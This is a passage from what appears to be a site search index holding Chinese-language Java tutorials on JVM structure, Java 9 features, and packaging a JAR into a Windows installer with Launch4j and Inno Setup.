read.read(readbytebuffer);\n        if(readbytebuffer.hasremaining()) {\n            system.out.println("文件内容："+new string(readbytebuffer.array()));\n        }\n        read.close();\n\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n',charsets:{cjk:!0}},{title:"JVM 模块介绍",frontmatter:{title:"JVM 模块介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/jvm/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/02.JVM/1.JVM%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D.html",relativePath:"00.语言/01.JAVA/02.JVM/1.JVM模块介绍.md",key:"v-26d5b34d",path:"/language/java/jvm/1/",headers:[{level:2,title:"JVM 总体图",slug:"jvm-总体图",normalizedTitle:"jvm 总体图",charIndex:2}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"JVM 总体图",content:"# JVM 总体图\n\n学习 JVM 引导：\n\n * 首先了解 JVM 模块的组成，由 4 个组成部分 类加载器 、 运行时数据区 、 执行引擎 、 本地方法接口\n * 了解 JVM 整个运行机制，了解类加载机制\n * 了解运行时数据区的重要组成部分， PC程序计数器 、 虚拟机栈 、 堆区 、 元数据区 、 本地方法栈",normalizedContent:"# jvm 总体图\n\n学习 jvm 引导：\n\n * 首先了解 jvm 模块的组成，由 4 个组成部分 类加载器 、 运行时数据区 、 执行引擎 、 本地方法接口\n * 了解 jvm 整个运行机制，了解类加载机制\n * 了解运行时数据区的重要组成部分， pc程序计数器 、 虚拟机栈 、 堆区 、 元数据区 、 本地方法栈",charsets:{cjk:!0}},{title:"JAVA9 新特性总结",frontmatter:{title:"JAVA9 新特性总结",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/version/2/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/03.%E7%89%88%E6%9C%AC/2.JAVA9%20%E6%96%B0%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93.html",relativePath:"00.语言/01.JAVA/03.版本/2.JAVA9 新特性总结.md",key:"v-1177a00b",path:"/language/java/version/2/",headers:[{level:2,title:"模块机制",slug:"模块机制",normalizedTitle:"模块机制",charIndex:2},{level:2,title:"JShell交互式编程",slug:"jshell交互式编程",normalizedTitle:"jshell 交互式编程",charIndex:1743},{level:2,title:"接口中的private方法",slug:"接口中的private方法",normalizedTitle:"接口中的 private 方法",charIndex:2433},{level:2,title:"集合类新增工厂方法",slug:"集合类新增工厂方法",normalizedTitle:"集合类新增工厂方法",charIndex:3090},{level:2,title:"改进的Stream API",slug:"改进的stream-api",normalizedTitle:"改进的 stream api",charIndex:3496},{level:2,title:"其他小改动",slug:"其他小改动",normalizedTitle:"其他小改动",charIndex:4355}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"模块机制 JShell交互式编程 接口中的private方法 集合类新增工厂方法 改进的Stream API 其他小改动",content:'# 模块机制\n\n当我们导入一个 jar 包做为依赖时（包括 JDK 官方库），实际上很多功能我们并不会用到，但是由于他们是属于同一个 jar 捆绑在一起，这样就会导致我们可能只用到一部分功能，但是需要引用一个完整的类库，实际上我们可以把用不到的类库排除掉，大大降低 jar 库的规模。\n\nJAVA9 引入了模块机制来对这种情况进行优化，在之前我们的项目如下：\n\n\n\n引入模块机制之后，如下：\n\n\n\n可以看到，模块可以由一个或者多个在一起的 Java 包组成，通过江这些包分出不同的模块，我们就可以按照模块的方式进行管理了。这里我们创建一个新的项目，并在 src 目录下，搭建 module-info.java 文件表示此项目采用模块机制，我们可以在 idea 右键创建 module-info.java 文件\n\n\n\n\n\n在 JAVA 9 如果不创建 module-info.java，则所有包都会被加载，若希望分的清楚，可以创建 module-info.java，一旦创建 module-info.java 则只会导入 JAVA9 的部分基础包，如 Logger 类，以前用的是 java.util.logging 的，但创建 module-info.java 后只有 java.lang.System 下的，我们可以在 module-info.java 导入我们想用的\n\n\n\n\n\n\n\n如果加了 module-info.java 则需要清楚了解你需要使用的包位于哪里，如果使用反射的话，没有导入这样的包会报错，如下对 String 做反射报错结果\n\n\n\n\n\nJAVA9 的反射 API 封装和安全性得到了改进，如果模块没有明确授权给其他模块使用反射的权限，那么其他模块是不允许使用反射进行修改的，看来 Unsafe 类是完不成了。对于模块的机制具有以下四中类型：\n\n * 系统模块：来自 JDK 和 JRE 的模块（官方提供的模块，比如我们上面用的），我们也可以直接使用 java --list-modules 命令来列出所有的模块，不同的模块会导出不同的包供我们使用。\n * 应用程序模块：我们自己写的 JAVA 模块项目\n * 自动模块：可能有些库并不是 Java9 以上的模块项目，这种时候需要做兼容了，默认情况下是直接导出所有的包，可以访问所有其他模块提供类，不然之前版本的库就用不了了。\n * 未命名的模块：我们自己创建的一个 Java 项目，如果没有创建 module-info.java，那么会按照未命名模块进行处理，未命名模块同样可以访问所有其他模块提供的类，这样我们之前写的 java8 代码才能政策地在 java9 以及之后的版本下运行。不过，由于没有使用 java9 的模块新特性，未命名模块只能默认暴露给其他未命名的模块和自动模块，应用程序模块无法访问这些（实际上就是传统 java8 以下的变成模式，因为没有模块只需要导包就行）\n\n我们也可以自己写一些 jar 提供别人使用，在使用的时候使用 module-info.java 让控制哪些导入，哪些不导入\n\n\n\n\n\n\n\n\n\nrequires 还可以加 static 关键字，加了 static 之后，在编译的时候会依然有这个包，但是在运行的时候就会报找不到该包。\n\n\n\n除了 exports 可以跟 to 关键字，代表暴露给谁，指明哪些包可以使用我这个包\n\n\n\n\n\n当 a 使用了某些包后，默认 b 是不能使用 a 所使用的包的，也就是没有传递性，我们所导入包 requires 后面加 transitive 关键字让其把依赖传递\n\n\n\n\n\n如果我们对 以上的 User 使用反射，也是不能直接使用的，会报错\n\n\n\n\n\n需要使用 open 关键字对整个所需要反射的 module 进行描述，如果不想对 module 进行描述，也可以对 module 下的需要反射类所在的包进行 opens 描述\n\n\n\n\n\nuses 语句使用服务接口的名字，当前模块就会发现它，使用 java.util.ServiceLoader 类进行加载，必须是本模块中的，不能是其他模块中的。其实现类可以由其他模块提供.\n\n\n\n\n\n\n# JShell 交互式编程\n\njava9 为我们提供了一种交互式变成工具 Jshell，你还别说，真有 Python 的味道\n\nC:\\Users\\User>jshell\n|  欢迎使用 JShell -- 版本 17.0.3.1\n|  要大致了解该版本, 请键入: /help intro\n\njshell>\n\n\n1\n2\n3\n4\n5\n\n\n环境配置完成后，我们只需要输入 jshell 命令即可开启交互式编程了，它支持我们一条一条命令进行操作。比如我们来做一个简单的计算：\n\njshell> int a = 10\na ==> 10\n\njshell> int b = 10\nb ==> 10\n\njshell> int c = a/b\nc ==> 1\n\njshell>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n使用 /vars 可以看到我们定义的所有变量\n\njshell> /vars\n|    int a = 10\n|    int b = 10\n|    int c = 1\n\n\n1\n2\n3\n4\n\n\n我们也可以创一个方法，并通过 /method 方法列出所有方法，并调用方法\n\njshell> public int max(int a,int b){\n   ...>     return a > b? a: b;\n   ...> }\n|  已创建 方法 max(int,int)\n\njshell> /method\n|    int max(int,int)\n\njshell> max(19,20)\n$5 ==> 20\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 接口中的 private 方法\n\n在 Java8 中，接口中的方法支持添加 default 关键字来添加默认实现；而在 java9 中，接口再次得到强化，提供接口中可以存在私有方法。\n\npackage com.b;\n\npublic interface Test {\n\n    default void test(){\n        this.test1();\n        System.out.println("默认方法");\n    }\n\n    private void test1(){\n        System.out.println("私有方法");\n    }\n\n    static void test2(){\n        System.out.println("静态方法");\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\npackage com.b;\n\npublic class MainB implements Test {\n\n    public static void main(String[] args){\n        MainB mainB = new MainB();\n        mainB.test();\n        Test.test2();\n    }\n\n}\n\n私有方法\n默认方法\n静态方法\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 集合类新增工厂方法\n\n在之前，如果我们想要快速创建一个 Map 可以通过以下方式\n\n    public static void main(String[] args){\n        Map<String,String> map = new HashMap(3);\n        map.put("key","value");\n        \n        map = new HashMap<String,String>(3){{\n            put("key","value");\n        }};    \n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n在 java9 之后，我们可以直接通过 of 方法来快速创建，但是这种方式就不能使用 put 方法\n\nMap<String, String> key = Map.of("key", "value");\n\n\n1\n\n\n\n# 改进的 Stream API\n\n    public static void main(String[] args){\n        // java8 只能使用of，为null会报错\n        Stream.of(null).forEach(System.out::println);\n\n        // Java9 允许为null\n        Stream.ofNullable(null).forEach(System.out::println);\n\n        // java8 允许生成无限的数据，可以用limit限制\n        Stream.iterate(0,i -> i+1).limit(20).forEach(System.out::println);\n\n        // java9 变为使用表达式来限制 相当于 for (int i=0;i<20;i++)\n        Stream.iterate(0,i -> i < 20,i -> i + 1).forEach(System.out::println);\n\n        // java9 还增加了截断流, i < 10，生成 小于 10 的数据\n        Stream.iterate(0,i -> i < 20,i -> i + 1).takeWhile(i -> i>10).forEach(System.out::println);\n\n        // java9 还增加了删除流, i < 10，小于 10 的数据都被删掉，相当于值打印 i >= 10 的数据\n        Stream.iterate(0,i -> i < 20,i -> i + 1).dropWhile(i -> i>10).forEach(System.out::println);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 其他小改动\n\njava7 新增了 Try-with-resources（只有实现了 AutoCloseable 或 Closeable 接口的资源），JAVA9 有对 try 增强\n\npublic void java8(){\n        try (InputStream stream = Files.newInputStream(Paths.get("pom.xml"))){\n                stream....\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    public void java9() throws IOException {\n        InputStream stream = Files.newInputStream(Paths.get("pom.xml"));\n        try (stream){\n            for (int i = 0; i < 100; i++) {\n                System.out.println(stream.read());\n            }\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nOptional 增强\n\n    public void java8(){\n        String s = null;\n        Optional.ofNullable(s).ifPresent(str -> System.out.println("str = " + str));\n    }\n\n    public void java9() throws IOException {\n        String s = null;\n        // 类似于 if else\n        Optional.ofNullable(s)\n                .ifPresentOrElse(str -> System.out.println("str = " + str),() -> System.out.println("MainB.java9"));\n    }\n\n    public void java9_1()  {\n        String s = null;\n        // 类似于 if else\n        Optional.ofNullable(s)\n                .ifPresentOrElse(str -> System.out.println("str = " + str),() -> System.out.println("MainB.java9"));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n',normalizedContent:'# 模块机制\n\n当我们导入一个 jar 包做为依赖时（包括 jdk 官方库），实际上很多功能我们并不会用到，但是由于他们是属于同一个 jar 捆绑在一起，这样就会导致我们可能只用到一部分功能，但是需要引用一个完整的类库，实际上我们可以把用不到的类库排除掉，大大降低 jar 库的规模。\n\njava9 引入了模块机制来对这种情况进行优化，在之前我们的项目如下：\n\n\n\n引入模块机制之后，如下：\n\n\n\n可以看到，模块可以由一个或者多个在一起的 java 包组成，通过江这些包分出不同的模块，我们就可以按照模块的方式进行管理了。这里我们创建一个新的项目，并在 src 目录下，搭建 module-info.java 文件表示此项目采用模块机制，我们可以在 idea 右键创建 module-info.java 文件\n\n\n\n\n\n在 java 9 如果不创建 module-info.java，则所有包都会被加载，若希望分的清楚，可以创建 module-info.java，一旦创建 module-info.java 则只会导入 java9 的部分基础包，如 logger 类，以前用的是 java.util.logging 的，但创建 module-info.java 后只有 java.lang.system 下的，我们可以在 module-info.java 导入我们想用的\n\n\n\n\n\n\n\n如果加了 module-info.java 则需要清楚了解你需要使用的包位于哪里，如果使用反射的话，没有导入这样的包会报错，如下对 string 做反射报错结果\n\n\n\n\n\njava9 的反射 api 封装和安全性得到了改进，如果模块没有明确授权给其他模块使用反射的权限，那么其他模块是不允许使用反射进行修改的，看来 unsafe 类是完不成了。对于模块的机制具有以下四中类型：\n\n * 系统模块：来自 jdk 和 jre 的模块（官方提供的模块，比如我们上面用的），我们也可以直接使用 java --list-modules 命令来列出所有的模块，不同的模块会导出不同的包供我们使用。\n * 应用程序模块：我们自己写的 java 模块项目\n * 自动模块：可能有些库并不是 java9 以上的模块项目，这种时候需要做兼容了，默认情况下是直接导出所有的包，可以访问所有其他模块提供类，不然之前版本的库就用不了了。\n * 未命名的模块：我们自己创建的一个 java 项目，如果没有创建 module-info.java，那么会按照未命名模块进行处理，未命名模块同样可以访问所有其他模块提供的类，这样我们之前写的 java8 代码才能政策地在 java9 以及之后的版本下运行。不过，由于没有使用 java9 的模块新特性，未命名模块只能默认暴露给其他未命名的模块和自动模块，应用程序模块无法访问这些（实际上就是传统 java8 以下的变成模式，因为没有模块只需要导包就行）\n\n我们也可以自己写一些 jar 提供别人使用，在使用的时候使用 module-info.java 让控制哪些导入，哪些不导入\n\n\n\n\n\n\n\n\n\nrequires 还可以加 static 关键字，加了 static 之后，在编译的时候会依然有这个包，但是在运行的时候就会报找不到该包。\n\n\n\n除了 exports 可以跟 to 关键字，代表暴露给谁，指明哪些包可以使用我这个包\n\n\n\n\n\n当 a 使用了某些包后，默认 b 是不能使用 a 所使用的包的，也就是没有传递性，我们所导入包 requires 后面加 transitive 关键字让其把依赖传递\n\n\n\n\n\n如果我们对 以上的 user 使用反射，也是不能直接使用的，会报错\n\n\n\n\n\n需要使用 open 关键字对整个所需要反射的 module 进行描述，如果不想对 module 进行描述，也可以对 module 下的需要反射类所在的包进行 opens 描述\n\n\n\n\n\nuses 语句使用服务接口的名字，当前模块就会发现它，使用 java.util.serviceloader 类进行加载，必须是本模块中的，不能是其他模块中的。其实现类可以由其他模块提供.\n\n\n\n\n\n\n# jshell 交互式编程\n\njava9 为我们提供了一种交互式变成工具 jshell，你还别说，真有 python 的味道\n\nc:\\users\\user>jshell\n|  欢迎使用 jshell -- 版本 17.0.3.1\n|  要大致了解该版本, 请键入: /help intro\n\njshell>\n\n\n1\n2\n3\n4\n5\n\n\n环境配置完成后，我们只需要输入 jshell 命令即可开启交互式编程了，它支持我们一条一条命令进行操作。比如我们来做一个简单的计算：\n\njshell> int a = 10\na ==> 10\n\njshell> int b = 10\nb ==> 10\n\njshell> int c = a/b\nc ==> 1\n\njshell>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n使用 /vars 可以看到我们定义的所有变量\n\njshell> /vars\n|    int a = 10\n|    int b = 10\n|    int c = 1\n\n\n1\n2\n3\n4\n\n\n我们也可以创一个方法，并通过 /method 方法列出所有方法，并调用方法\n\njshell> public int max(int a,int b){\n   ...>     return a > b? a: b;\n   ...> }\n|  已创建 方法 max(int,int)\n\njshell> /method\n|    int max(int,int)\n\njshell> max(19,20)\n$5 ==> 20\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 接口中的 private 方法\n\n在 java8 中，接口中的方法支持添加 default 关键字来添加默认实现；而在 java9 中，接口再次得到强化，提供接口中可以存在私有方法。\n\npackage com.b;\n\npublic interface test {\n\n    default void test(){\n        this.test1();\n        system.out.println("默认方法");\n    }\n\n    private void test1(){\n        system.out.println("私有方法");\n    }\n\n    static void test2(){\n        system.out.println("静态方法");\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\npackage com.b;\n\npublic class mainb implements test {\n\n    public static void main(string[] args){\n        mainb mainb = new mainb();\n        mainb.test();\n        test.test2();\n    }\n\n}\n\n私有方法\n默认方法\n静态方法\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 集合类新增工厂方法\n\n在之前，如果我们想要快速创建一个 map 可以通过以下方式\n\n    public static void main(string[] args){\n        map<string,string> map = new hashmap(3);\n        map.put("key","value");\n        \n        map = new hashmap<string,string>(3){{\n            put("key","value");\n        }};    \n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n在 java9 之后，我们可以直接通过 of 方法来快速创建，但是这种方式就不能使用 put 方法\n\nmap<string, string> key = map.of("key", "value");\n\n\n1\n\n\n\n# 改进的 stream api\n\n    public static void main(string[] args){\n        // java8 只能使用of，为null会报错\n        stream.of(null).foreach(system.out::println);\n\n        // java9 允许为null\n        stream.ofnullable(null).foreach(system.out::println);\n\n        // java8 允许生成无限的数据，可以用limit限制\n        stream.iterate(0,i -> i+1).limit(20).foreach(system.out::println);\n\n        // java9 变为使用表达式来限制 相当于 for (int i=0;i<20;i++)\n        stream.iterate(0,i -> i < 20,i -> i + 1).foreach(system.out::println);\n\n        // java9 还增加了截断流, i < 10，生成 小于 10 的数据\n        stream.iterate(0,i -> i < 20,i -> i + 1).takewhile(i -> i>10).foreach(system.out::println);\n\n        // java9 还增加了删除流, i < 10，小于 10 的数据都被删掉，相当于值打印 i >= 10 的数据\n        stream.iterate(0,i -> i < 20,i -> i + 1).dropwhile(i -> i>10).foreach(system.out::println);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 其他小改动\n\njava7 新增了 try-with-resources（只有实现了 autocloseable 或 closeable 接口的资源），java9 有对 try 增强\n\npublic void java8(){\n        try (inputstream stream = files.newinputstream(paths.get("pom.xml"))){\n                stream....\n        }catch(exception e){\n            e.printstacktrace();\n        }\n    }\n\n    public void java9() throws ioexception {\n        inputstream stream = files.newinputstream(paths.get("pom.xml"));\n        try (stream){\n            for (int i = 0; i < 100; i++) {\n                system.out.println(stream.read());\n            }\n        }catch(exception e){\n            e.printstacktrace();\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\noptional 增强\n\n    public void java8(){\n        string s = null;\n        optional.ofnullable(s).ifpresent(str -> system.out.println("str = " + str));\n    }\n\n    public void java9() throws ioexception {\n        string s = null;\n        // 类似于 if else\n        optional.ofnullable(s)\n                .ifpresentorelse(str -> system.out.println("str = " + str),() -> system.out.println("mainb.java9"));\n    }\n\n    public void java9_1()  {\n        string s = null;\n        // 类似于 if else\n        optional.ofnullable(s)\n                .ifpresentorelse(str -> system.out.println("str = " + str),() -> system.out.println("mainb.java9"));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n',charsets:{cjk:!0}},{title:"jar 打包成.exe可执行文件",frontmatter:{title:"jar 打包成.exe可执行文件",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/other/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/04.%E5%85%B6%E4%BB%96/1.%E6%89%93%E5%8C%85exe%E7%A8%8B%E5%BA%8F.html",relativePath:"00.语言/01.JAVA/04.其他/1.打包exe程序.md",key:"v-71786ef2",path:"/language/java/other/1/",headers:[{level:2,title:"使用 Launch4j",slug:"使用-launch4j",normalizedTitle:"使用 launch4j",charIndex:33},{level:3,title:"Basic",slug:"basic",normalizedTitle:"basic",charIndex:1575},{level:3,title:"JRE",slug:"jre",normalizedTitle:"jre",charIndex:697},{level:3,title:"console",slug:"console",normalizedTitle:"console",charIndex:1777},{level:2,title:"使用 Inno Setup",slug:"使用-inno-setup",normalizedTitle:"使用 inno setup",charIndex:1802},{level:3,title:"Setup",slug:"setup",normalizedTitle:"setup",charIndex:52},{level:3,title:"Dirs",slug:"dirs",normalizedTitle:"dirs",charIndex:2243},{level:3,title:"Files",slug:"files",normalizedTitle:"files",charIndex:2006},{level:3,title:"Registry",slug:"registry",normalizedTitle:"registry",charIndex:2430},{level:3,title:"Run",slug:"run",normalizedTitle:"run",charIndex:2608}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"使用 Launch4j Basic JRE console 使用 Inno Setup Setup Dirs Files Registry Run",content:'要将一个 Java JAR 文件打包成可执行的 EXE 文件，可以使用 Launch4j 和 Inno Setup 来完成这个任务。\n\nLaunch4j 用于将 Java 应用程序打包为本机可执行文件（通常为 EXE 文件）的工具。它的主要作用是创建一个包装器，允许用户像运行本机 Windows 应用程序一样运行 Java 应用程序，而无需手动启动 Java 虚拟机（JVM）。 Launch4j 是一个免费的开源项目，它遵循 GNU General Public License（GPL）许可证。这意味着你可以免费使用 Launch4j 来创建可执行文件，包括商业用途。你可以从 Launch4j 的官方网站下载并使用它，无需支付许可费用。官网地址\n\nLaunch4j 功能有：\n\n * 创建本机可执行文件：Launch4j 允许你将你的 Java 应用程序打包为一个本机的可执行文件（通常是 EXE 文件）。这意味着用户可以双击该文件来运行你的 Java 应用程序，而无需手动打开命令行或 JVM。\n * 自定义可执行文件属性：你可以通过 Launch4j 配置可执行文件的各种属性，如程序图标、文件版本信息、标题等。这有助于使你的 Java 应用程序看起来像本机 Windows 应用程序。\n * 支持类路径和 JAR 文件：Launch4j 允许你指定应用程序的类路径和关联的 JAR 文件，以确保你的 Java 应用程序能够正常运行。\n * 自动检测 Main-Class：它可以自动检测你的 JAR 文件中的 Main-Class，从而无需手动指定应用程序的入口点。\n * 支持 JRE 选项：你可以选择将 JRE（Java 运行时环境）打包到生成的可执行文件中，从而用户无需安装 JRE 即可运行你的应用程序。\n * 跨平台兼容性：生成的可执行文件通常只能在 Windows 上运行，但 Launch4j 可以在 Windows 上创建用于其他平台的包装器，例如 Linux 或 macOS。\n\nInno Setup 本身不能直接将 JAR 文件打包成 EXE 文件。所以我们要先使用 Launch4j 把 jar 打包成一个 exe 格式的可执行程序。Inno Setup 是一个免费的开源安装制作工具，它遵循许可证允许免费使用，包括商业用途。Inno Setup 的主要作用是创建用于安装和卸载 Windows 应用程序的安装程序。官网地址\n\nInno Setup 功能有：\n\n * 创建自定义安装程序：Inno Setup 允许开发人员创建定制的、易于使用的安装程序，用于将他们的应用程序部署到 Windows 操作系统上。你可以定义安装过程的各个方面，包括文件复制、注册表项、快捷方式、开始菜单项等。\n * 支持多种安装任务：Inno Setup 支持各种各样的安装任务，包括简单的文件复制，注册表设置，创建快捷方式，以及执行自定义脚本和任务。这使得你可以轻松地自定义安装过程，以满足你的应用程序的特定需求。\n * 脚本化：Inno Setup 使用基于脚本的语言来定义安装过程。这意味着你可以编写脚本来描述安装程序的行为，使其非常灵活。Inno Setup 使用类似于 Pascal 的脚本语言。\n * 多语言支持：Inno Setup 支持多种语言，允许你为不同的用户群体创建多语言安装程序，以提供本地化的安装和卸载体验。\n * 卸载支持：Inno Setup 不仅可以创建安装程序，还可以生成卸载程序，允许用户从他们的计算机上卸载你的应用程序。\n\n\n# 使用 Launch4j\n\nLaunch4j 把 jar 包装成 .exe 程序还是有所局限的，比如启动方式只能是 java -jar，如果配合混淆就没有办法\n\n\n# Basic\n\n在这里配置路径等信息\n\n\n\nOutput file: 填写把 jar 打成.exe 程序的输出路径\njar：选择自己要打包的 jar\n\n\n# JRE\n\n在这里配置 JVM，JDK 版本等信息\n\n\n\nJRE paths：不需要我们填\nMin JRE version：最低 JDK 版本\nMax JRE version：最高 JDK 版本\nJVM option：设置 JVM 启动参数\n\n\n# console\n\n设置 console\n\n\n\n# 使用 Inno Setup\n\nInno Setup 还是有些难度的，需要学习里面的各个关键字，回调，事件等，才能掌握 Inno Setup 的使用\n\n以下贴一个简单的 Inno Setup 示例\n\n;配置和描述安装程序的整体设置和行为\n[Setup]\n; 应用名称\nAppName=Easy-Manager-Tool\n; 应用版本\nAppVersion=1.0\n; 默认安装目录 {pf}为 Program Files 这个路径是类似于 C:\\Program Files 的形式\nDefaultDirName={pf}\\emt\n; 应用输出到文件路径\nOutputDir=C:\\Users\\User\\Desktop\\tool\\gen\n; 输出文件的名称\nOutputBaseFilename=emt\n; 指定应用程序的发布者或公司名称\nAppPublisher=\n; 应用程序发布者的网站或URL\nAppPublisherURL=\n\n; 创建目录 {app} 当表应用所在的路径\n[Dirs]\nName: "{app}\\go"; Permissions: everyone-full\n\n; 添加文件\n[Files]\nSource: "C:\\Users\\User\\Desktop\\build\\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs\n\n; 注册表\n[Registry]\nRoot: HKLM; Subkey: "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment"; ValueType: string; ValueName: "Path"; ValueData: "{olddata};{app}\\jdk\\bin"\n\n; 运行脚本\n[Run]\nFilename: "{sys}\\cmd.exe"; Parameters: "/C setx PATH ""{app}\\go\\bin;%PATH%"""; Flags: runasoriginaluser; StatusMsg: "Setting PATH for Go..."; Check: not Is64BitInstallMode\nFilename: "{app}\\runBuild.bat"; Description: "runBuild.bat";\nFilename: "cmd.exe"; Parameters: "/c setx PATH ""%PATH%;{app}\\jdk\\bin"" /m"; Flags: runhidden; WorkingDir: {app}; StatusMsg: "Updating PATH environment variable..."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# Setup\n\n用于配置和描述安装程序的整体设置和行为。在 [Setup] 部分中，你可以指定各种安装程序的属性，例如应用程序名称、版本号、安装目录、输出目录等。以下是 [Setup] 可以描述的一些重要内容：\n\n * AppName：这个选项用于指定安装程序的应用程序名称。它将在安装过程中显示给用户，通常用于在开始菜单、卸载项等位置显示应用程序的名称。\n * AppVersion：用于定义安装程序的版本号。这可以是你的应用程序的实际版本号，以帮助用户了解安装的内容。\n * DefaultDirName：指定默认的安装目录。可以使用预定义的常量（如 {pf} 代表 Program Files 目录），或者指定一个具体的路径。\n * OutputDir：定义生成安装程序的输出目录。这是指定生成的安装文件（通常是 .exe 文件）将被保存的位置。\n * OutputBaseFilename：指定生成的安装程序的文件名，通常是一个 .exe 文件。这将是用户运行的实际安装程序文件的名称。\n * AppPublisher：用于指定应用程序的发布者或公司名称，它将在安装过程中显示。\n * AppPublisherURL：可用于提供应用程序发布者的网站或 URL，这也将在安装过程中显示。\n * AppSupportURL：可以包含支持或帮助信息的 URL。\n * AppUpdatesURL：如果有关于应用程序更新的信息或 URL，可以在这里指定。\n * AppMutex：用于指定应用程序的互斥体名称，以确保在安装过程中只能运行一个实例。\n * DefaultGroupName：定义开始菜单中应用程序快捷方式的默认组名。\n * AllowUNCPath：指定是否允许安装到 UNC 路径（网络共享路径）。\n * UninstallDisplayIcon：定义卸载程序的显示图标。\n * UninstallDisplayName：指定卸载程序的显示名称。\n * UninstallString：定义卸载程序的执行命令。\n\n\n# Dirs\n\n用于定义在用户计算机上创建的目录结构。通过 [Dirs] 部分，你可以指定要在目标计算机上创建的目录，以便在安装过程中将文件复制到这些目录中。以下是 [Dirs] 可以描述的内容：\n\n 1. 目录名称：在 [Dirs] 部分中，你可以列出要创建的目录的名称。这些目录名称通常是相对于安装目录（由 [Setup] 部分的 DefaultDirName 指定）的相对路径。\n 2. Permissions：你可以为每个目录指定权限，例如读、写、执行权限。这允许你控制用户是否可以访问或修改这些目录中的文件。\n 3. Subdirectories：你可以定义子目录，以便在目录创建时同时创建子目录。这有助于构建复杂的目录结构\n\n\n# Files\n\n用于指定要在安装过程中包含的文件和它们的安装目标。通过 [Files] 部分，你可以定义要复制到目标计算机上的文件、文件的源路径和文件的目标路径，以及其他文件相关的属性。以下是 [Files] 可以描述的内容：\n\n * Source：这个字段指定了要复制的文件的源路径。你可以指定完整的文件路径，也可以使用通配符来包括多个文件。\n * DestDir：用于指定文件的目标目录。这是文件在用户计算机上的最终安装位置。\n * DestName：指定文件在目标计算机上的名称。这可以是与源文件不同的名称。\n * Check：这个字段允许你定义文件的检查方法，以确保文件在复制到目标计算机上时没有被更改或损坏。\n * Permissions：你可以为每个文件定义权限，包括文件的读、写、执行权限。这允许你控制用户对文件的访问权限。\n * Attribs：允许你为文件定义属性，如只读、隐藏等。\n * FontInstall：如果你的安装程序包含字体文件，你可以使用这个字段来安装字体文件并注册它们。\n * Flags：用于指定与文件相关的特定标志，例如创建快捷方式。\n\n\n# Registry\n\n用于在 Windows 注册表中创建、修改或删除键和值。通过 [Registry] 部分，你可以配置你的安装程序在用户计算机上创建注册表项，以存储应用程序的配置信息、关联文件扩展、文件关联等等。以下是 [Registry] 可以描述的内容：\n\n * Root：指定注册表项的根键，通常是 HKEY_LOCAL_MACHINE 或 HKEY_CURRENT_USER。不同的根键对应不同的部分，例如 HKEY_LOCAL_MACHINE 用于系统范围的设置，而 HKEY_CURRENT_USER 用于当前用户的设置。\n * Subkey：指定注册表项的子键路径。这是注册表中的目标位置。\n * ValueName：定义注册表值的名称。这可以是一个字符串，通常用于存储应用程序的配置信息。\n * ValueType：指定注册表值的类型，如字符串、整数等。\n * ValueData：定义注册表值的数据。这是实际的值，可以是文本、数字等。\n * Flags：用于指定注册表项和值的属性，例如创建、删除、覆盖等。\n * Permissions：你可以定义注册表项的权限，以确保只有具有适当权限的用户才能访问或修改注册表项。\n\n\n# Run\n\n用于在安装过程中指定要运行的可执行文件、脚本或其他程序。通过 [Run] 部分，你可以配置安装程序在安装完成后或卸载程序时执行的操作。以下是 [Run] 可以描述的内容：\n\n * Filename：指定要运行的文件的路径，这可以是一个可执行文件（.exe）、脚本（.bat、.cmd、.vbs 等）或其他程序。\n * 